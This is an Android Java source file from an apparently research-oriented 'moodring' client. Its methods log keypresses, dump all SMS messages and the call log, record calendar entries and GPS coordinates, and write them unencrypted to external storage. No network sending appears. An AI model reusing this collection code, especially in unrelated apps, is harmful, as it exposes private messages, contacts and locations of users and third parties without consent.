package com.medialab.moodring.client;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Date;

import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.provider.CalendarContract;
import android.provider.CallLog;

public class LogMethods {
	static String SDCARD = Environment.getExternalStorageDirectory().getAbsolutePath();

	public static void appendLog(String text, String FILENAME)
	{       
		File logFile = new File(SDCARD + "/" + FILENAME);
		if (!logFile.exists())
		{
			try
			{
				logFile.createNewFile();
			} 
			catch (IOException e)
			{
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		try
		{
			//BufferedWriter for performance, true to set append to file flag
			BufferedWriter buf = new BufferedWriter(new FileWriter(logFile, true)); 
			buf.append(text);
			buf.newLine();
			buf.flush();
			buf.close();
		}
		catch (IOException e)
		{
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public static void keyLogger (String keypress, String FILENAME){
		Date date=new Date() ;
		long now = date.getTime();
		appendLog(String.valueOf(now) + "," + keypress ,FILENAME);
	}
	public static void dumpSms(ContentResolver cr, String FILENAME){

		//Debug.waitForDebugger();
		Uri uri = Uri.parse("content://sms");
		//Uri uri = Uri.parse("content://sms/inbox"); -- For ingoing
		//Uri uri = Uri.parse("content://sms/sent"); -- For all Sent Items


		//In this example we are using Query as we have defined URi as above.
		//We have declared all the Column names we need in string array in the second parameter.
		//If you dont need all then leave null
		//Notice that we did not call managedQuery instead we used Query method of ContentResolve
		String[] strFields = new String[] {"person", "address", "type", "date", "body"};
		Cursor messagesCursor = cr.query(uri, strFields, null,null, null);

		String toPrint = new String();
		for (String col_name:strFields){
			toPrint += "\"" + col_name + "\",";
		}
		toPrint += "\n";

		if (messagesCursor != null) {
			/*Looping through the results*/
			while (messagesCursor.moveToNext()) 
			{
				/*Body*/
				String date = messagesCursor.getString(messagesCursor.getColumnIndex("date"));

				/*type*/
				String type = messagesCursor.getString(messagesCursor.getColumnIndex("type"));

				/*Body*/
				String msgBody = messagesCursor.getString(messagesCursor.getColumnIndex("body"));

				/*address*/
				String number = messagesCursor.getString(messagesCursor.getColumnIndex("address"));

				/*Contact Name*/  
				String name = messagesCursor.getString(messagesCursor.getColumnIndex("person"));


				toPrint += "\""+name+"\"," + "\""+number+"\"," + type + "," + date + "," + "\""+msgBody+"\"" + "\n";

			}
			appendLog(toPrint ,FILENAME);
			messagesCursor.close();

		}
	}

	public static void dumpCalls (ContentResolver cr, String FILENAME){
		String[] strFields = {
				CallLog.Calls.CACHED_NAME,
				CallLog.Calls.NUMBER,
				CallLog.Calls.TYPE,
				CallLog.Calls.DATE,
				CallLog.Calls.DURATION,
		};
		String strOrder = android.provider.CallLog.Calls.DATE + " DESC"; 

		Cursor mCallCursor = cr.query(
				android.provider.CallLog.Calls.CONTENT_URI,
				strFields,
				null,
				null,
				strOrder
				);
		String toPrint = new String();
		for (String col_name:strFields){
			toPrint += "\"" + col_name + "\",";
		}
		toPrint += "\n";		
		if (mCallCursor != null) {
			/*Looping through the results*/
			while (mCallCursor.moveToNext()) 
			{
				/*Date*/
				long dateTimeMillis = mCallCursor.getLong(mCallCursor.getColumnIndex(CallLog.Calls.DATE));

				/*Call Type – Incoming, Outgoing, Missed*/
				int callType = mCallCursor.getInt(mCallCursor.getColumnIndex(CallLog.Calls.TYPE));

				/*Contact Name*/  
				String name = mCallCursor.getString(mCallCursor.getColumnIndex(CallLog.Calls.CACHED_NAME));

				/*Contact Number*/
				String number = mCallCursor.getString(mCallCursor.getColumnIndex(CallLog.Calls.NUMBER));

				/*Duration*/
				long durationMillis = mCallCursor.getLong(mCallCursor.getColumnIndex(CallLog.Calls.DURATION));

				toPrint += "\""+name+"\"," + "\""+number+"\"," + String.valueOf(callType) + "," + String.valueOf(dateTimeMillis) + "," + String.valueOf(durationMillis) +  "\n";

			}
			appendLog(toPrint ,FILENAME);
			mCallCursor.close();
		}
	}

	@SuppressLint("NewApi")
	public static void dumpCalender (ContentResolver cr, String FILENAME){
		String[] strFields = {
				CalendarContract.Instances.BEGIN,
				CalendarContract.Instances.END,
				CalendarContract.Instances.EVENT_ID,
		};
		Date date=new Date() ;
		long now = date.getTime();
		Cursor mCalendarCursor = android.provider.CalendarContract.Instances.query(cr, strFields, 0, now + 999999999);
		String toPrint = new String();
		for (String col_name:strFields){
			toPrint += "\"" + col_name + "\",";
		}
		toPrint += "\n";
		if (mCalendarCursor != null) {
			/*Looping through the results*/
			while (mCalendarCursor.moveToNext()) 
			{
				/*Begin*/
				String begin = mCalendarCursor.getString(mCalendarCursor.getColumnIndex(CalendarContract.Instances.BEGIN));

				/*End*/
				String end = mCalendarCursor.getString(mCalendarCursor.getColumnIndex(CalendarContract.Instances.END));

				/*End*/
				String event_id = mCalendarCursor.getString(mCalendarCursor.getColumnIndex(CalendarContract.Instances.EVENT_ID));


				toPrint += begin + "," + end + "," + event_id  + "\n";

			}
			appendLog(toPrint ,FILENAME);
			mCalendarCursor.close();
		}
	}


	public static void gpsLogger (double lat, double lon , String FILENAME){

		Date date=new Date() ;
		long now = date.getTime();
		appendLog(String.valueOf(now) + "," + lat + "," + lon ,FILENAME);
	}
}
